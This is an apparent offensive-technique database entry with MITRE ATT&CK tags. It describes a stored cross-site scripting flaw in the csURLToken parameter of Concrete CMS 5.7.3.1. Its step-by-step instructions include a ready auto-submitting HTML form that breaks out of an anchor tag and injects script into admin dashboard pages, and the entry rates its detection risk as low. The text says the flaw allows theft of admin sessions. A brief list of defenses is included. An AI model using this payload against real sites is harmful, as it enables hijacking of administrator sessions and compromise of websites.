---
tags:
  - xss
  - stored-xss
  - community-connect
  - concrete-cms
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/complete-community-connect-with-xss-in-csurltoken]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.398Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: d793a028-bbd4-4c99-a556-861fb60e43e6
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored-XSS-via-Community-Connect-in-Concrete-CMS

## Summary

This procedure injects stored XSS into the csURLToken POST parameter during community connect completion in Concrete CMS 5.7.3.1 at /index.php/dashboard/extend/connect/connect_complete, persisting a script that executes on dashboard extend page views to target admin users.

## Description

The URL token field is output in an anchor tag without encoding, allowing attackers to close the tag and inject a script. This affects dashboard users, enabling session theft in admin contexts. Requires access to the connect feature.

## Requirements

1. Authenticated access to dashboard extend/connect
2. Valid csToken for the connect process
3. Web browser

## Defense

Defensive measures and detection strategies:

- Validate and encode URL tokens as plain text only
- Restrict connect features to trusted inputs
- Audit dashboard access logs for script injections
- Use strict CSP for dashboard pages

## Objectives

1. Inject script via URL token breakout
2. Execute on admin dashboard views
3. Compromise extended community features

## Instructions

### Step 1: Initiate Community Connect

**Context**: Start the connect process to access the completion form.

Navigate to dashboard extend connect.

### Step 2: Submit Payload

**Context**: Break out of <a> tag with payload.

**Command** ([[commands/complete-community-connect-with-xss-in-csurltoken]]):
```html
<html>
<body>
<form method="POST" action="http://[host]/concrete5/index.php/dashboard/extend/connect/connect_complete">
<input type="hidden" name="csToken" value="my_token">
<input type="hidden" name="csURLToken" value="</a><script>alert(/XSS/)</script>">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

> Replace my_token and [host].

### Step 3: Verify on Dashboard

**Context**: Load the extend page.

Access /index.php/dashboard/extend/.

**Expected Output**: Alert triggers.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/complete-community-connect-with-xss-in-csurltoken]]

## Tools Used


## Tags

- xss
- stored-xss
- concrete-cms
